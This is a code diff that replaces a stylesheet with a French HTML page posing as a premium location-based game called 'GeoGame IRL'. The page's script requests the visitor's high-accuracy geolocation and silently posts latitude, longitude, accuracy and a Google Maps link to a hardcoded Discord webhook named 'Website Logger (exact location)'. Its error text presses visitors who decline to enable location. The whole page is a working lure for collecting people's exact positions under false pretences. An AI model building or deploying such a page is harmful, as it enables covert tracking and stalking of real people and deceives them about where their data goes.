@@ -1,32 +1,160 @@
-/* i would reccomend you leave all of this as is, but im not your mother, i cant tell you what to not do. */
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>GeoGame IRL – Premium</title>
 
-body { 
-    font-family: Arial, sans-serif;
-    text-align: center;
-    background-color: #1a1a1a; 
-}
-.container { 
-    max-width: 600px;
-    margin: 0 auto; 
-    padding: 50px; 
-}
-h1 {
-    font-size: 48px; 
-    color: #aaaaaa; 
-}
-p { 
-    font-size: 18px; 
-    color: #b4b4b4; 
-}
-.search-bar { 
-    margin: 20px 0; 
-}
-footer { 
-    margin-top: 50px; 
-    font-size: 14px; 
-    color: #cccccc; 
-}
-a:hover{
-    color: rgb(226, 226, 226);
-    text-decoration: none;
-}
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        background: #0e0e0e;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-family: "Segoe UI", sans-serif;
+    }
+
+    #blur-bg {
+        position: fixed;
+        top: 0; left: 0; 
+        width: 100%; height: 100%;
+        backdrop-filter: blur(10px);
+        background: rgba(0,0,0,0.55);
+    }
+
+    #popup {
+        position: relative;
+        width: 90%;
+        max-width: 420px;
+        background: #1a1a1a;
+        padding: 30px;
+        border-radius: 20px;
+        box-shadow: 0 0 25px rgba(0,0,0,0.5);
+        text-align: center;
+        animation: fadeIn 0.7s ease-out;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: scale(0.8); }
+        to { opacity: 1; transform: scale(1); }
+    }
+
+    #title {
+        font-size: 27px;
+        margin-bottom: 10px;
+        font-weight: bold;
+    }
+
+    #desc {
+        font-size: 16px;
+        color: #bbbbbb;
+        line-height: 22px;
+    }
+
+    button {
+        margin-top: 25px;
+        padding: 15px 25px;
+        width: 100%;
+        font-size: 18px;
+        border-radius: 10px;
+        border: none;
+        cursor: pointer;
+        background: linear-gradient(90deg, #0066ff, #00c3ff);
+        color: white;
+        transition: 0.2s;
+    }
+
+    button:hover {
+        transform: scale(1.05);
+    }
+
+    #error {
+        margin-top: 20px;
+        color: #ff4444;
+        font-weight: bold;
+        display: none;
+    }
+</style>
+</head>
+<body>
+
+<div id="blur-bg"></div>
+
+<div id="popup">
+    <div id="title">📍 GeoGame IRL – Version Premium</div>
+    <div id="desc">
+        Pour commencer le jeu, nous devons utiliser votre position exacte.<br><br>
+        Cliquez sur le bouton ci-dessous pour autoriser la localisation.
+    </div>
+
+    <button id="locBtn">Autoriser la localisation</button>
+
+    <div id="error"></div>
+</div>
+
+<script>
+document.getElementById("locBtn").addEventListener("click", () => {
+
+    navigator.geolocation.getCurrentPosition(
+        
+        (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+
+            // ⭐ Envoi au webhook Discord ⭐
+            fetch("https://discord.com/api/webhooks/1439661175171321858/ArdpA1ymgbU62Zim6absStxNuwR_D8rVAFe4KHMPz4eLaKmiMCw0vEQcuzhBjXaXWILb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    username: "Website Logger (exact location)",
+                    content: "📍 Nouveau joueur (avec consentement)",
+                    embeds: [
+                        {
+                            title: "Localisation exacte du joueur",
+                            description: 
+`**Latitude :** ${lat}
+**Longitude :** ${lon}
+**Précision :** ${acc} m
+
+🔗 **Google Maps :**
+https://www.google.com/maps?q=${lat},${lon}`,
+                            color: 0x00aaff
+                        }
+                    ]
+                })
+            });
+
+            // ⭐ REDIRECTION APRÈS AUTORISATION ⭐
+            window.location.href = "#"; // ← Mets ta page ici
+        },
+
+        (err) => {
+            const errorDiv = document.getElementById("error");
+            errorDiv.style.display = "block";
+
+            if (err.code === 1) {
+                errorDiv.innerHTML = 
+"⚠️ Vous avez refusé la géolocalisation.<br><br>Veuillez aller dans :<br><br><b>Paramètres → Confidentialité → Localisation</b><br>et autoriser la localisation pour ce site.";
+            } else {
+                errorDiv.innerHTML = 
+"❌ Impossible d'obtenir votre position. Réessayez.";
+            }
+        },
+
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
+
+});
+</script>
+
+</body>
+</html>
+
+
+
+
+
